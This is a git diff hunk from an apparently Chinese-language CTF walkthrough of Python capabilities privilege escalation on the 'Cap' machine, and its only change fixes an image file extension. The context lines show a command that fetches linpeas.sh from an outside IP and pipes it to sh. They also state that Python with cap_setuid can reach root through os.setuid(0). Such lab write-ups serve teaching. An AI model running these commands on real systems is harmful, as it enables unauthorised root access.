@@ -22,7 +22,7 @@ Python Capabilities 提权漏洞
 ```
 nathan@cap:~$ curl 10.10.14.92/linpeas.sh | sh 
 ```
-![梦想不曾迷失](images/92705202)
+![梦想不曾迷失](images/92705202.png)
 ### 只要 Python 拥有 cap_setuid，就能通过 os.setuid(0) 提权为 root。
 抓到的内容如下：
 ```
